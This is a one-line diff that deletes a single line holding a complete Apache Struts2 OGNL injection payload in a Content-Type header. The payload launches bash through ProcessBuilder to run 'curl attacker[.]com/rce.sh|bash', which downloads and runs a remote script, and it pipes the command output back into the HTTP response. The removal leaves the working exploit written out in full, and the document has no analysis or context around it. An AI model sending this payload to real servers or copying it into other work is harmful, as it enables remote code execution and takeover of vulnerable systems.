@@ -1,1 +1,0 @@
-Content-Type: %{(#_='multipart/form-data').(#cmd='curl attacker[.]com/rce.sh|bash').(#p=new java.lang.ProcessBuilder({'bash','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
